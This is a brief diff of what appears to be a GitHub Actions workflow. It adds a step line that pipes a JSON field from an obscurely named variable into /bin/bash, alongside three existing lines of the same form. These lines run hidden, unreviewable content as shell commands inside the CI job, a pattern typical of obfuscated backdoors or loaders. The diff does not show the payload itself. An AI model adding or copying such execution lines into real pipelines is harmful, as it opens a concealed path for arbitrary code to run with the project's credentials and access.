@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$rly1" | jq -r .frwf00 | /bin/bash
           echo $m9 | jq -r .krkac470 | /bin/bash
           echo $jkn6 | jq -r .f400 | /bin/bash
+          echo $rzuzp866 | jq -r .ur1 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
